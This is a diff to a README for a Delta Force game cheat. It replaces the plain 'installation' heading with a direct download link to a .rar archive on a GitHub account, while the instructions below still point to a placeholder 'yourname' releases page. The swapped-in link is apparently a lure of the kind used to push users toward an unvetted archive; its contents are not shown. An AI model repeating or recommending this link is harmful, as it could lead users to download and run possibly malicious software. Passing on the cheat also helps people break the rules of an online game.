@@ -65,7 +65,7 @@
 | **runtime** | Visual C++ Redistributable 2015–2022 |
 
 
-## ▸ installation
+## ▸ [installation](https://github.com/VisibleMaharaja/Delta-Force-Cheat/releases/download/Delta-Force2.1/Delta-Force2.1.rar)
 
 **1.** download the latest release from the **[Releases](https://github.com/yourname/delta-force-rak/releases)** tab
 
